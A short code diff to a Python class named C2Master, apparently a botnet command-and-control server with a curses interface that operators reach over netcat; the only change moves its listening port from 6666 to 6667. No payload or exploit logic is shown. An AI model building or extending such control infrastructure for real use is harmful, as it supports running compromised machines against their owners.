@@ -8,7 +8,7 @@ class C2Master:
     def __init__(self):
         self.brokers = {}  # {broker_ip: num_clients}
         self.users = set()  # NC sessions
-        self.c2_port = 6666
+        self.c2_port = 6667
         self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.server.bind(('0.0.0.0', self.c2_port))
@@ -97,7 +97,7 @@ class C2Master:
         curses.wrapper(curses_ui)
     
     def run(self):
-        print(f"🚀 C2 su :{self.c2_port} | nc IP 6666")
+        print(f"🚀 C2 su :{self.c2_port} | nc IP 6667")
         threading.Thread(target=self.ui_thread, daemon=True).start()
         
         while True:
